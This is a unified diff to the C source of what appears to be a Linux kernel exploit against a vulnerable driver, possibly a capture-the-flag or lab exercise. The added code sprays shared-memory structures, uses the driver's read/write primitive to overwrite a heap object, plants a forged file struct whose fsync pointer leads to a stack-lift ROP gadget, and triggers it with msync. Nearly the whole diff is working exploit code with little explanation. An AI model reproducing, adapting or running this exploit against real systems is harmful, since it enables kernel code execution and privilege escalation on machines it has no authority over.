@@ -8,6 +8,8 @@
 #include <sys/mman.h>
 #include <sys/types.h>
 #include <sys/shm.h>
+#include <sys/ipc.h>
+#include <string.h>
 
 #include "../heap.h"
 #include "sof.h"
@@ -82,7 +84,6 @@ void create_rop_mem(){
     mem[off++] = user_ss;
 }
 
-
 void driver_free(unsigned long address){
 	int ret;
 
@@ -126,21 +127,42 @@ void driver_read_write(void* to, void* from, size_t size){
 	free(rw);
 }
 
-void create_shm_file_data(int id){
+void *create_shm_file_data(int id){
 	void * ret;
 	ret = shmat(id, NULL, SHM_RDONLY);
 	if((long)ret == -1){
 		printf("[-] Failed to allocate shm_file_struct\n");
-		perror("shm");
+		perror("shmat");
+		exit(-1);
 	}
+	return ret;
+}
+
+int get_shm_id(){
+	int ret;
+
+	printf("[+] Getting shmid...\n");
+
+	ret = shmget(IPC_PRIVATE, 0x1000, SHM_R|SHM_W);
+	if(ret == -1){
+		printf("[-] Failed to get shmid\n");
+		perror("shmget");
+		exit(-1);
+	}
+	printf("[+] Received shmid: %d\n", ret);
+	return ret;
 }
 
 int main(){
-	int ret;
+	int ret, shmid, fd2;
 	struct iomalloc *iom;
-	unsigned long target[4] = {0};
+	unsigned long target[8] = {0};
 	unsigned long payload[4] = {0};
 	unsigned int off = 4;
+	struct file s_file;
+	struct file_operations f_ops;
+	struct shm_file_data sfd;
+	void *address;
 
 	save_state();
 	create_rop_mem();
@@ -168,14 +190,50 @@ int main(){
 	iom->size = 32;
 	iom->addr = NULL;
 
-	
-	printf("[+] Creating shm_file_data struct...\n");
-	create_shm_file_data(5000);
+
+	for(int i=0; i<10; i++){
+		shmid = get_shm_id();
+		create_shm_file_data(shmid);
+	}
+
+	f_ops.fsync = (void*)stacklift;
+	s_file.f_op = &f_ops;
+
+	shmid = get_shm_id();
 	printf("[+] Allocating address...\n");
 	driver_alloc(iom);
+	address = create_shm_file_data(shmid);
+	driver_read_write(iom->addr, payload, 32);
+	printf("%p\n", iom->addr);
+	driver_read_write(target, iom->addr, 8 * sizeof(unsigned long));
+
+	if((int)target[4] != shmid){
+		printf("[-] Spraying unsuccessfull\n");
+		exit(-1);
+	}
+
+	printf("[+] Spraying successfull\n");
+	s_file.private_data = (void*)(((unsigned long)iom->addr) + 32);
+	target[6] = (unsigned long)&s_file;
+
+	printf("[+] Sending payload...\n");
+	driver_read_write(iom->addr, target, 8 * sizeof(unsigned long));
+
+	printf("sync: %p\n", s_file.f_op->fsync);
+
+	printf("[+] Triggering exploit...\n");
+	ret = msync(address, 0x1000, MS_SYNC);
+	if(ret != 0){
+		perror("msync");
+	}
+
+	printf("[+] Triggered...\n");
+	printf("address of file struct: %p\n", &s_file);
 
 	driver_free((unsigned long)iom->addr);
 
+
+	close(fd2);
 	close(fd);
 	free(iom);
 }
